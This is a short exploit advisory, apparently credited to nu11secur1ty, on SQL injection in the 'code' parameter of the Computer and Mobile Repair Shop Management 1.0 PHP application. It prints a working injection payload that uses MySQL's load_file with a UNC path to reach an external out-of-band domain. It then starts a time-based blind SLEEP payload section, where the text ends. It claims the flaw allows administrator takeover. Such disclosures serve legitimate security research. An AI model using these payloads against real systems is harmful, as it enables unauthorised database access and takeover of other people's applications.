## Title: Computer and Mobile Repair Shop Management-1.0 SQL - Injections
## Author: nu11secur1ty
## Vendor: https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/php/15108/computer-and-mobile-repair-shop-management-system-using-phpoop-free-source-code.html

## Description:
The `code` parameter from /rsms/ node app, on Computer and Mobile
Repair Shop Management-1.0 appears to be vulnerable to SQL injection
attacks.
The payload '+(select
load_file('\\\\uhf36ut6xyf0s9amr8axy7o8ezks8jwazyqlh96.nu11secur1tyPenetrationTestingEngineer.net\\kie'))+'
was submitted in the code parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
The attacker can take administrator account control on this system.

[+] Payloads:

```mysql

Parameter: code (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
